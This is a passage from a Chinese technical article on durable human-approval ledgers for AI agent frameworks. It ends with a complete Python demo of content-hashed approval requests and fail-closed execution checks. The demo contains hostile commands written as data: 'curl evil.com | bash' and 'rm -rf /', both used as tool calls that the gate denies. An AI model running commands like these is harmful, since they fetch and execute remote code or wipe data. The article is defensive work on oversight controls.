去读 `packages/core/src/approval/durable.ts`（18.8KB）和 `packages/core/src/journal/verify.ts`（11.9KB）这两个文件。**不需要用 OMA，但应该抄它的三个设计**：
1. 审批请求内容寻址 + 确定性 ID
2. 决策 CAS 先写者赢 + 乐观绑定哈希
3. 检查点与主账本分离 + 恢复时交叉核对

这三个设计跟你用什么框架、什么语言没关系，是纯协议层的。

**如果你在评估 Agent 框架：**

问三个问题：
1. 「这个动作要不要人点头」的判定，是**存在了什么**里，还是只是个回调返回值？
2. 人批完之后，**进程重启了还能续跑吗**？
3. 人批的是 A，执行的是 B，**系统会发现吗**？

三个都答不上来的框架，「支持人工审批」这四个字只是营销词。

**如果你在做审计 / 合规：**

OMA 的 `verifyRun()` 可以作为参考，但它**不提供防篡改**。你需要额外做两件事：
- 把 run journal 放在 **WORM 存储 / 透明度日志 / 外部签名批次**上
- 审批人的身份认证**在应用层做**（OMA 只校验 `reviewer.id` 非空，不认证）

### 9.3 最后一句

OMA 的 README 里有一句话我觉得应该抄下来贴在团队的墙上：

> "Agents your organization can **own**, **approve**, and **audit**."

这三个动词的顺序不是随便排的。

**own** 说的是归属——数据和密钥在你手里，不在别人的 SaaS 里。
**approve** 说的是控制——不是「提示词里请求一下」，而是「一个可持久化、可验证、失败即关闭的事实」。
**audit** 说的是事后——你能拿出证据说明「当时人批的就是这份内容，运行执行的就是这份内容」。

目前生态里，第一件（own）已经有不少项目在做，第二件（approve）几乎无人认真做，第三件（audit）更是雷声大雨点小。

**第二个动词，才是这两年 Agent 落地真正卡住的地方。**

---

## 附录：完整 MVP 代码

下面是本文完整的 `oma_mvp.py`，可以直接保存运行（Python 3.10+，零第三方依赖）：

```python
#!/usr/bin/env python3
"""
oma_mvp.py — 从 open-multi-agent/open-multi-agent 抽离的「持久化审批 + 内容寻址」核心机制复刻

抽取自 OMA 的三个文件：
  - packages/core/src/approval/durable.ts   （DurableApprovalLedger）
  - packages/core/src/journal/hash.ts        （canonicalContentHash）
  - packages/core/src/types.ts               （ApprovalRequest / ApprovalDecisionRecord）

保留的不变量：
  1. 审批请求的 ID 是内容寻址的 —— 同样的内容必然得到同样的 ID
  2. requestHash 绑定被审阅的确切内容 —— 内容变了，旧决策立即失效
  3. 决策是 CAS 的 —— 先写者赢，并发决策只有一个能成功
  4. 恢复时必须交叉核对「检查点里的待批」与「主账本里的决策」
"""

from __future__ import annotations

import hashlib
import json
from dataclasses import dataclass, field
from enum import Enum
from typing import Any


# ---------- 第一部分：核心数据模型 ----------

class ApprovalScope(str, Enum):
    PLAN = "plan"
    TASK_ROUND = "task_round"
    TASK_DISPATCH = "task_dispatch"
    TOOL_CALL = "tool_call"


class Decision(str, Enum):
    APPROVED = "approved"
    REJECTED = "rejected"


class ApprovalError(Exception):
    def __init__(self, code: str, message: str) -> None:
        super().__init__(f"{code}: {message}")
        self.code = code


@dataclass(frozen=True)
class ApprovalRequest:
    version: int
    id: str
    run_id: str
    scope: ApprovalScope
    boundary: str
    request_hash: str
    requested_at: str
    content: dict[str, Any]
    reason: str | None = None


@dataclass(frozen=True)
class ApprovalDecision:
    version: int
    request_id: str
    run_id: str
    scope: ApprovalScope
    request_hash: str
    decision: Decision
    reviewer_id: str
    decided_at: str


# ---------- 第二部分：稳定 JSON 与内容哈希 ----------

def stable_json(value: Any) -> str:
    """对象键在每一层排序；数组顺序保留；拒绝非 JSON 类型与循环引用。"""
    if value is None:
        return "null"
    if isinstance(value, bool):
        return "true" if value else "false"
    if isinstance(value, (int, float)):
        if isinstance(value, float) and (value != value or value in (float("inf"), float("-inf"))):
            raise ApprovalError("APPROVAL_VALIDATION_ERROR", "内容包含非有限数字")
        return json.dumps(value)
    if isinstance(value, str):
        return json.dumps(value, ensure_ascii=False)
    if isinstance(value, (list, tuple)):
        return "[" + ",".join(stable_json(v) for v in value) + "]"
    if isinstance(value, dict):
        parts = []
        for key in sorted(value.keys()):
            parts.append(f"{json.dumps(key, ensure_ascii=False)}:{stable_json(value[key])}")
        return "{" + ",".join(parts) + "}"
    raise ApprovalError("APPROVAL_VALIDATION_ERROR", f"不支持的 {type(value).__name__} 数据")


def sha256_hex(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


def hash_approval_request(scope: ApprovalScope, boundary: str, content: dict[str, Any]) -> str:
    """requestHash = sha256(stable_json({scope, boundary, content}))。
    reason / requestedAt 被排除 —— 它们是元数据，不是被审阅的内容。"""
    payload = {"scope": scope.value, "boundary": boundary, "content": content}
    return sha256_hex(stable_json(payload))


def make_request_id(run_id: str, scope: ApprovalScope, boundary: str, request_hash: str) -> str:
    """确定性 ID：同样内容 → 同样 ID。"""
    seed = f"{run_id}\n{scope.value}\n{boundary}\n{request_hash}"
    return "apr_" + sha256_hex(seed)[:32]


# ---------- 第三部分：带 CAS 的键值存储 ----------

class CasStore:
    """OMA 的 MemoryStore.compareAndSet 契约的最小实现。"""

    def __init__(self) -> None:
        self._data: dict[str, str] = {}
        self._meta: dict[str, dict[str, Any]] = {}

    def get(self, key: str) -> tuple[str, dict[str, Any]] | None:
        if key not in self._data:
            return None
        return self._data[key], self._meta.get(key, {})

    def compare_and_set(self, key, expected, new_value, metadata=None) -> bool:
        current = self._data.get(key)
        if expected is None:
            if current is not None:
                return False
        elif current != expected:
            return False
        self._data[key] = new_value
        if metadata:
            self._meta[key] = metadata
        return True


# ---------- 第四部分：DurableApprovalLedger ----------

class DurableApprovalLedger:
    APPROVAL_KEY_PREFIX = "__oma_approval__/"

    def __init__(self, store: CasStore) -> None:
        if not hasattr(store, "compare_and_set"):
            raise ApprovalError("APPROVAL_ATOMIC_STORE_REQUIRED", "审批决策要求存储支持 CAS")
        self.store = store

    @classmethod
    def approval_key(cls, request_id: str) -> str:
        return f"{cls.APPROVAL_KEY_PREFIX}{request_id}"

    def create_request(self, run_id, scope, boundary, content, reason=None,
                       requested_at="2026-11-24T00:00:00.000Z") -> ApprovalRequest:
        request_hash = hash_approval_request(scope, boundary, content)
        request = ApprovalRequest(
            version=1,
            id=make_request_id(run_id, scope, boundary, request_hash),
            run_id=run_id, scope=scope, boundary=boundary,
            request_hash=request_hash, requested_at=requested_at,
            content=content, reason=reason,
        )
        key = self.approval_key(request.id)
        payload = json.dumps(
            {"version": 1, "request": _request_to_dict(request), "decision": None},
            ensure_ascii=False, sort_keys=True,
        )
        created = self.store.compare_and_set(key, None, payload, {
            "namespace": "approval", "version": 1, "runId": run_id,
            "scope": scope.value, "requestHash": request_hash,
            "requestedAt": requested_at,
        })
        if not created:
            # OMA 的 ensureRequest 语义：请求是幂等的 —— 同样内容 → 同样 ID → 复用已存在的那一行。
            existing = self.load_request(request.id)
            if existing is None or existing.request_hash != request.request_hash:
                raise ApprovalError("APPROVAL_CONFLICT", f"审批请求 {request.id} 已存在且内容不一致")
            return existing
        return request

    def decide(self, request_id, request_hash, decision, reviewer_id,
               decided_at="2026-11-24T01:00:00.000Z") -> ApprovalDecision:
        """先写者赢。"""
        if decision not in ("approve", "reject"):
            raise ApprovalError("APPROVAL_VALIDATION_ERROR", "decision 必须是 approve 或 reject")
        if not reviewer_id.strip():
            raise ApprovalError("APPROVAL_VALIDATION_ERROR", "审批人 id 不能为空")

        key = self.approval_key(request_id)
        entry = self.store.get(key)
        if entry is None:
            raise ApprovalError("APPROVAL_NOT_FOUND", f"找不到审批请求 {request_id}")
        raw, _meta = entry
        try:
            record = json.loads(raw)
        except json.JSONDecodeError as exc:
            raise ApprovalError("APPROVAL_INTEGRITY_ERROR", "审批记录不是合法 JSON") from exc

        request = record["request"]
        if request["id"] != request_id:
            raise ApprovalError("APPROVAL_INTEGRITY_ERROR", "审批记录 ID 不匹配")
        if request["requestHash"] != request_hash:
            raise ApprovalError("APPROVAL_STALE_DECISION",
                                f"审批请求 {request_id} 在审阅之后已被改动，决策被拒绝")
        if record.get("decision") is not None:
            raise ApprovalError("APPROVAL_CONFLICT", f"审批请求 {request_id} 已有决策")

        approval_decision = ApprovalDecision(
            version=1, request_id=request_id, run_id=request["runId"],
            scope=ApprovalScope(request["scope"]), request_hash=request_hash,
            decision=Decision.APPROVED if decision == "approve" else Decision.REJECTED,
            reviewer_id=reviewer_id.strip(), decided_at=decided_at,
        )
        updated = dict(record)
        updated["decision"] = _decision_to_dict(approval_decision)
        swapped = self.store.compare_and_set(key, raw,
            json.dumps(updated, ensure_ascii=False, sort_keys=True),
            {"namespace": "approval", "version": 1, "runId": request["runId"],
             "scope": request["scope"], "requestHash": request_hash,
             "decision": approval_decision.decision.value,
             "reviewerId": approval_decision.reviewer_id,
             "decidedAt": approval_decision.decided_at})
        if not swapped:
            raise ApprovalError("APPROVAL_CONFLICT", f"审批请求 {request_id} 被并发决策")
        return approval_decision

    def load_decision(self, request_id: str) -> ApprovalDecision | None:
        entry = self.store.get(self.approval_key(request_id))
        if entry is None:
            return None
        record = json.loads(entry[0])
        if record.get("decision") is None:
            return None
        return _dict_to_decision(record["decision"])

    def load_request(self, request_id: str) -> ApprovalRequest | None:
        entry = self.store.get(self.approval_key(request_id))
        if entry is None:
            return None
        return _dict_to_request(json.loads(entry[0])["request"])


# ---------- 第五部分：执行侧 —— 恢复后执行前必须重验哈希 ----------

@dataclass
class Checkpoint:
    run_id: str
    pending_approvals: list[ApprovalRequest] = field(default_factory=list)
    approval_decisions: list[ApprovalDecision] = field(default_factory=list)

    def to_json(self) -> str:
        return json.dumps({
            "runId": self.run_id,
            "pendingApprovals": [_request_to_dict(r) for r in self.pending_approvals],
            "approvalDecisions": [_decision_to_dict(d) for d in self.approval_decisions],
        }, ensure_ascii=False, sort_keys=True)

    @classmethod
    def from_json(cls, raw: str) -> "Checkpoint":
        data = json.loads(raw)
        return cls(
            run_id=data["runId"],
            pending_approvals=[_dict_to_request(r) for r in data.get("pendingApprovals", [])],
            approval_decisions=[_dict_to_decision(d) for d in data.get("approvalDecisions", [])],
        )


def consume_approval_for_execution(ledger, checkpoint, request_id, current_content):
    """三道核对：检查点↔主账本↔当前内容。任何一条不满足就 fail-closed。"""
    cp_request = next((r for r in checkpoint.pending_approvals if r.id == request_id), None)
    if cp_request is None:
        raise ApprovalError("APPROVAL_NOT_FOUND", "检查点里没有这条待批审批")

    ledger_request = ledger.load_request(request_id)
    if ledger_request is None:
        raise ApprovalError("APPROVAL_NOT_FOUND", "主账本里没有这条审批")

    if ledger_request.request_hash != cp_request.request_hash:
        raise ApprovalError("APPROVAL_INTEGRITY_ERROR",
                            "检查点与主账本对同一条审批的哈希不一致 —— fail closed")

    decision = ledger.load_decision(request_id)
    if decision is None:
        raise ApprovalError("APPROVAL_NOT_FOUND", "这条审批还没有决策")

    cp_decision = next((d for d in checkpoint.approval_decisions
                         if d.request_id == request_id), None)
    if cp_decision is None:
        raise ApprovalError("APPROVAL_INTEGRITY_ERROR", "检查点里缺少对应的决策记录")
    if cp_decision.decision != decision.decision:
        raise ApprovalError("APPROVAL_INTEGRITY_ERROR",
                            "检查点与主账本的决策不一致 —— fail closed")

    # 最关键的一步：当前内容必须仍然等于被审阅的内容
    current_hash = hash_approval_request(
        ledger_request.scope, ledger_request.boundary, current_content)
    if current_hash != ledger_request.request_hash:
        raise ApprovalError("APPROVAL_STALE_DECISION",
                            "当前要执行的内容与被审阅的内容不同 —— fail closed")

    return ("execute" if decision.decision == Decision.APPROVED else "deny"), decision


# ---------- 第六部分：序列化辅助 ----------

def _request_to_dict(r: ApprovalRequest) -> dict[str, Any]:
    d = {"version": r.version, "id": r.id, "runId": r.run_id,
         "scope": r.scope.value, "boundary": r.boundary,
         "requestHash": r.request_hash, "requestedAt": r.requested_at,
         "content": r.content}
    if r.reason is not None:
        d["reason"] = r.reason
    return d


def _decision_to_dict(d: ApprovalDecision) -> dict[str, Any]:
    return {"version": d.version, "requestId": d.request_id, "runId": d.run_id,
            "scope": d.scope.value, "requestHash": d.request_hash,
            "decision": d.decision.value, "reviewerId": d.reviewer_id,
            "decidedAt": d.decided_at}


def _dict_to_request(d: dict[str, Any]) -> ApprovalRequest:
    return ApprovalRequest(
        version=d["version"], id=d["id"], run_id=d["runId"],
        scope=ApprovalScope(d["scope"]), boundary=d["boundary"],
        request_hash=d["requestHash"], requested_at=d["requestedAt"],
        content=d["content"], reason=d.get("reason"))


def _dict_to_decision(d: dict[str, Any]) -> ApprovalDecision:
    return ApprovalDecision(
        version=d["version"], request_id=d["requestId"], run_id=d["runId"],
        scope=ApprovalScope(d["scope"]), request_hash=d["requestHash"],
        decision=Decision(d["decision"]), reviewer_id=d["reviewerId"],
        decided_at=d["decidedAt"])


# ---------- 第七部分：演示 ----------

def run_demo() -> None:
    print("=" * 78)
    print("OMA 持久化审批机制复刻 —— 演示")
    print("=" * 78)

    store = CasStore()
    ledger = DurableApprovalLedger(store)

    print("\n[场景 1] Agent 请求执行 rm -rf ./build，触发 tool_call 审批门禁")
    tool_content = {
        "kind": "tool_call", "toolName": "bash",
        "rawInput": {"command": "rm -rf ./build"},
        "input": {"command": "rm -rf ./build"},
        "agentName": "coder", "taskId": "t-42", "toolCallId": "call-7",
        "consequential": True,
    }
    request = ledger.create_request(
        run_id="run-2026-11-24-01", scope=ApprovalScope.TOOL_CALL,
        boundary="t-42:call-7", content=tool_content,
        reason="删除构建产物，需人工确认")
    print(f"  requestId    = {request.id}")
    print(f"  requestHash  = {request.request_hash}")
    print(f"  boundary     = {request.boundary}")
    request2 = ledger.create_request(
        run_id="run-2026-11-24-01", scope=ApprovalScope.TOOL_CALL,
        boundary="t-42:call-7", content=tool_content)
    print(f"  同样的内容再次创建 → id 相同? {request2.id == request.id}  "
          f"hash 相同? {request2.request_hash == request.request_hash}")

    print("\n[场景 2] 运行挂起，检查点写入待批审批")
    checkpoint = Checkpoint(run_id="run-2026-11-24-01", pending_approvals=[request])
    print(f"  checkpoint 字节数 = {len(checkpoint.to_json())}")

    print("\n[场景 3] 三个错误决策全部被拒")
    try:
        ledger.decide(request.id, "0" * 64, "approve", reviewer_id="alice")
    except ApprovalError as e:
        print(f"  ❌ 哈希不符     → {e.code}")
    try:
        ledger.decide(request.id, request.request_hash, "approve", reviewer_id="  ")
    except ApprovalError as e:
        print(f"  ❌ 审批人无效   → {e.code}")
    try:
        ledger.decide(request.id, request.request_hash, "maybe", reviewer_id="alice")
    except ApprovalError as e:
        print(f"  ❌ 决策值非法   → {e.code}")

    print("\n[场景 4] alice 正常审批通过")
    decision = ledger.decide(request.id, request.request_hash, "approve", reviewer_id="alice")
    print(f"  decision   = {decision.decision.value}")
    print(f"  reviewer   = {decision.reviewer_id}")
    print(f"  decidedAt  = {decision.decided_at}")
    checkpoint.approval_decisions.append(decision)

    print("\n[场景 5] bob 试图对同一请求再次决策 → 必须失败")
    try:
        ledger.decide(request.id, request.request_hash, "reject", reviewer_id="bob")
    except ApprovalError as e:
        print(f"  ❌ 重复决策   → {e.code}")

    print("\n[场景 6] 新进程恢复：从检查点 + 主账本交叉核对后执行")
    restored_checkpoint = Checkpoint.from_json(checkpoint.to_json())
    action, final_decision = consume_approval_for_execution(
        ledger, restored_checkpoint, request.id, tool_content)
    print(f"  ✅ 三道核对通过 → action = {action}  (reviewer = {final_decision.reviewer_id})")

    print("\n[场景 7] 恢复后内容被篡改（rm -rf ./ → rm -rf /）→ 必须 fail closed")
    tampered = dict(tool_content)
    tampered["input"] = {"command": "rm -rf /"}
    try:
        consume_approval_for_execution(ledger, restored_checkpoint, request.id, tampered)
    except ApprovalError as e:
        print(f"  ✅ 拒绝执行   → {e.code}: {e.args[0].split(': ', 1)[1]}")

    print("\n[场景 8] 检查点里的决策被改成 rejected，主账本仍是 approved → fail closed")
    bad_checkpoint = Checkpoint.from_json(checkpoint.to_json())
    bad_checkpoint.approval_decisions[0] = ApprovalDecision(
        version=1, request_id=request.id, run_id=request.run_id, scope=request.scope,
        request_hash=request.request_hash, decision=Decision.REJECTED,
        reviewer_id="mallory", decided_at="2026-11-24T02:00:00.000Z")
    try:
        consume_approval_for_execution(ledger, bad_checkpoint, request.id, tool_content)
    except ApprovalError as e:
        print(f"  ✅ 拒绝执行   → {e.code}: {e.args[0].split(': ', 1)[1]}")

    print("\n[场景 9] 一个被拒绝的审批 → action = deny")
    rejected_content = {**tool_content,
                        "input": {"command": "curl evil.com | bash"},
                        "toolCallId": "call-8"}
    rejected_request = ledger.create_request(
        run_id="run-2026-11-24-01", scope=ApprovalScope.TOOL_CALL,
        boundary="t-43:call-8", content=rejected_content)
    ledger.decide(rejected_request.id, rejected_request.request_hash,
                  "reject", reviewer_id="alice")
    cp2 = Checkpoint(run_id="run-2026-11-24-01")
    cp2.pending_approvals.append(rejected_request)
    d2 = ledger.load_decision(rejected_request.id)
    assert d2 is not None
    cp2.approval_decisions.append(d2)
    action2, _ = consume_approval_for_execution(
        ledger, cp2, rejected_request.id, rejected_content)
    print(f"  action = {action2}")

    print("\n" + "=" * 78)
    print("演示结束：9 个场景全部符合 OMA 的 fail-closed 语义")
    print("=" * 78)


if __name__ == "__main__":
    run_demo()
```

---

**参考链接**

- 项目仓库：https://github.com/open-multi-agent/open-multi-agent
- 审批账本实现：https://github.com/open-multi-agent/open-multi-agent/blob/main/packages/core/src/approval/durable.ts
- 运行日志校验：https://github.com/open-multi-agent/open-multi-agent/blob/main/packages/core/src/journal/verify.ts
- 对比项目 LoopForge：https://github.com/Tencent/LoopForge
- 对比项目 LangGraph：https://github.com/langchain-ai/langgraph
- 对比项目 AGT：https://github.com/microsoft/agent-governance-toolkit
